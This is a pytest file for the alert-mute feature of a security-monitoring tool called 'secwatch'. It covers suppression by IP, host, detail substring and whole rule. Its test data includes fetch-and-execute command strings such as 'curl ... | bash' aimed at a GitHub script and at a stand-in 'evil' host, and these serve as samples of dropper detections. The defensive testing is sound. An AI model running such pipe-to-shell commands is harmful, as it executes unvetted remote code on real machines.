"""Alert mutes: targeted suppression by ip / host / detail-substring / whole-rule,
add/remove, and that detect.Engine._event stops alerting on a muted event while
still recording it."""


def _iso(config, tmp_path, monkeypatch):
    monkeypatch.setattr(config, "MUTES_FILE", tmp_path / "mutes.json")


def test_mute_by_ip(tmp_path, monkeypatch):
    from secwatch import config, mutes
    _iso(config, tmp_path, monkeypatch)
    mutes.add("secret_probe", "ip", "1.2.3.4")
    assert mutes.is_muted("secret_probe", ip="1.2.3.4")
    assert not mutes.is_muted("secret_probe", ip="9.9.9.9")
    assert not mutes.is_muted("scan", ip="1.2.3.4")          # different rule


def test_mute_by_detail_substring(tmp_path, monkeypatch):
    from secwatch import config, mutes
    _iso(config, tmp_path, monkeypatch)
    mutes.add("dropper", "detail", "githubusercontent.com/Paco5687/autormm")
    assert mutes.is_muted("dropper", detail="... curl -fsSL https://raw.githubusercontent.com/Paco5687/autormm/main/deploy/get.sh | bash")
    assert not mutes.is_muted("dropper", detail="curl http://evil.example/x | bash")


def test_mute_by_host_and_wholerule(tmp_path, monkeypatch):
    from secwatch import config, mutes
    _iso(config, tmp_path, monkeypatch)
    mutes.add("edge_silent", "host", "traefik")
    assert mutes.is_muted("edge_silent", host="traefik")
    assert not mutes.is_muted("edge_silent", host="nginx")
    mutes.add("crawler", "*")
    assert mutes.is_muted("crawler", ip="8.8.8.8", host="anything")


def test_add_validation_and_remove(tmp_path, monkeypatch):
    from secwatch import config, mutes
    _iso(config, tmp_path, monkeypatch)
    ok, _ = mutes.add("", "ip", "1.2.3.4")
    assert not ok                                            # rule required
    ok, _ = mutes.add("dropper", "detail", "")
    assert not ok                                            # value required for a field
    mutes.add("scan", "ip", "5.5.5.5")
    mutes.remove("scan", "ip", "5.5.5.5")
    assert not mutes.is_muted("scan", ip="5.5.5.5")


def test_muted_event_records_but_does_not_alert(tmp_path, monkeypatch):
    from secwatch import config, db, detect, mutes
    _iso(config, tmp_path, monkeypatch)
    monkeypatch.setattr(config, "DB_PATH", tmp_path / "t.db")
    conn = db.connect()
    alerted = []
    eng = detect.Engine(conn, alert_cb=lambda e: alerted.append(e))
    mutes.add("dropper", "detail", "autormm")
    # space the two past the (ip,rule) dedup window (EVENT_SUPPRESS) so both record
    eng.emit("-", "dropper", "high", "curl .../autormm/get.sh | bash", host="host", now=1_000_000)
    eng.emit("-", "dropper", "high", "curl http://evil/x | bash", host="host", now=1_000_900)
    conn.commit()
    assert conn.execute("SELECT COUNT(*) c FROM events WHERE rule='dropper'").fetchone()["c"] == 2
    assert len(alerted) == 1
    assert "evil" in alerted[0]["detail"]
